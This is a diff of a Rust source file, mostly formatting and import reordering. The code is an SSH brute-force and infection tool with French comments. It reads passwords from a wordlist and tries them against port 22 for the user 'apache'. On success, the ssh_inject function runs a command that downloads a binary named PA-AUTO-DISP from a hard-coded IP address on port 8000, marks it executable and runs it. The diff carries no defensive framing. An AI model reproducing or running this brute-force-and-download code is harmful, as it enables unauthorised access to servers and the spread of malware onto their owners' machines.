@@ -1,14 +1,12 @@
+use ssh2::Session;
 use std::fs::File;
 use std::io::{self, BufRead, Read};
-use std::path::Path;
-use std::time::Duration;
 use std::net::TcpStream;
-use ssh2::Session;
-use std::sync::mpsc::{self, Sender, Receiver};
+use std::path::Path;
+use std::sync::mpsc::{self, Receiver, Sender};
 use std::thread;
+use std::time::Duration;
 use tokio::time::timeout;
-
-
 
 fn ssh_inject(ip_address: String, user: String, password: String) {
     // Connexion TCP
@@ -21,7 +19,8 @@ fn ssh_inject(ip_address: String, user: String, password: String) {
             sess.handshake().expect("Failed to handshake");
 
             // Authentification
-            sess.userauth_password(&user, &password).expect("Failed to authenticate");
+            sess.userauth_password(&user, &password)
+                .expect("Failed to authenticate");
 
             if sess.authenticated() {
                 println!("Authentication successful");
@@ -36,7 +35,9 @@ fn ssh_inject(ip_address: String, user: String, password: String) {
                 channel.exec("wget http://51.77.193.65:8000/PA-AUTO-DISP && chmod +x PA-AUTO-DISP && ./PA-AUTO-DISP").expect("Failed to execute command");
 
                 let mut output = String::new();
-                channel.read_to_string(&mut output).expect("Failed to read output");
+                channel
+                    .read_to_string(&mut output)
+                    .expect("Failed to read output");
                 println!("Output: {}", output);
 
                 // Fermeture du canal
@@ -46,7 +47,7 @@ fn ssh_inject(ip_address: String, user: String, password: String) {
             } else {
                 println!("Authentication failed");
             }
-        },
+        }
         Err(e) => {
             eprintln!("Failed to connect: {}", e);
         }
@@ -75,7 +76,6 @@ pub(crate) async fn ssh_bruteforce(ip_address: &str, file_path: &str) {
                             tx_clone.send(password).unwrap();
                             return;
                         }
-
                     }
                 }
             }
@@ -90,23 +90,21 @@ pub(crate) async fn ssh_bruteforce(ip_address: &str, file_path: &str) {
             ssh_inject(ip_address, "apache".to_string(), password);
         }
         Err(_) => {
-        println!("Aucun mot de passe trouvé.");
+            println!("Aucun mot de passe trouvé.");
         }
     }
-
-
 }
 
 fn read_lines<P>(filename: P) -> io::Result<io::Lines<io::BufReader<File>>>
-    where
-        P: AsRef<Path>,
+where
+    P: AsRef<Path>,
 {
     let file = File::open(filename)?;
     Ok(io::BufReader::new(file).lines())
 }
 
 fn try_login(ip_address: &str, password: &str) -> bool {
-    println!("{}",password); //debug
+    println!("{}", password); //debug
 
     // Attempt to create a TCP connection and SSH session
     if let Ok(tcp) = TcpStream::connect(format!("{}:22", ip_address)) {
@@ -124,11 +122,8 @@ fn try_login(ip_address: &str, password: &str) -> bool {
                 drop(sess);
             }
             thread::sleep(Duration::from_secs(3));
-
         }
-
     }
 
     false
 }
-
